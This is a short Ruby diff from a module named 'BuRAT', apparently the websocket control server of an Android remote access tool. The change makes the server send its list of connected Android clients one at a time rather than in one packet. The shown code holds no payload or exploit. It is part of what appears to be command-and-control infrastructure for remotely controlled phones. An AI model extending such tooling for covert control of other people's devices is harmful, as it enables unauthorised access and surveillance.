@@ -29,8 +29,10 @@ module BuRAT
             p "#{header} #{trailer}"        # debug
 
             if header == "androids" then # clients - list of clients
-              packet = packet("androids", @androids, 'androids')
-              ws.send(packet)
+              @androids.each do |android|
+                packet = packet("android", android, 'android')
+                ws.send(packet)
+              end
             elsif header == "android" then # client - client identification
               android = @androids.find { |android| android["id"] == payload["id"] }
               payload.store("status", "Online")
